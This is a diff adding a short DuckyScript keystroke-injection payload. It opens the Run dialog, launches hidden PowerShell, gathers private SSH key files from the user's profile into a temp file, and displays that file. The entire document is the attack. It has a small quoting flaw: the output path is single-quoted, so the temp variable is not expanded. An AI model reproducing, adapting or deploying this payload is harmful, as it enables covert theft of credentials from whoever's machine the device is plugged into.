@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -Command "& { $keys = Get-ChildItem -Path \"$env:USERPROFILE\.ssh\" -ErrorAction SilentlyContinue | Where-Object {$_.Extension -eq '' -or $_.Extension -eq '.pem' -or $_.Extension -eq '.key'}; $out = '$env:TEMP\px_ssh.txt'; foreach($k in $keys) { Add-Content $out \"=== $($k.FullName) ===/\"; Get-Content $k.FullName | Add-Content $out }; if($keys) { notepad $out } else { Write-Host 'No SSH keys found' } }"
+ENTER
